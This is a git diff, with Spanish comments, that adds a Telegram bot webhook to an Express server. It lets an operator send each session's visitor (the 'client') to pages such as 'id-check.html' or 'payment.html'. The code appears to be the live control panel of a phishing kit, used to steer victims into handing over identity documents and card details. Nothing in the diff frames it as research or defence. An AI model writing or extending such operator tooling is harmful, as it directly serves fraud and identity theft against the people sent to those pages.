@@ -77,3 +77,29 @@ app.get('/get-redirect/:sessionId', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));
+
+app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
+    const update = req.body;
+
+    if (update.callback_query) {
+        const chatId = update.callback_query.message.chat.id;
+        const data = update.callback_query.data; // contiene: go:id-check.html, go:payment.html
+
+        const sessionId = extractSessionId(update.callback_query.message.text); // si decides incluirlo en el texto
+        const target = data.replace('go:', '');
+
+        redirectionTable[sessionId] = target;
+
+        // Notificamos al usuario en Telegram
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+            callback_query_id: update.callback_query.id,
+            text: `Redireccionando al cliente a ${target}`,
+            show_alert: true
+        });
+
+        res.sendStatus(200);
+    } else {
+        res.sendStatus(200);
+    }
+});
+
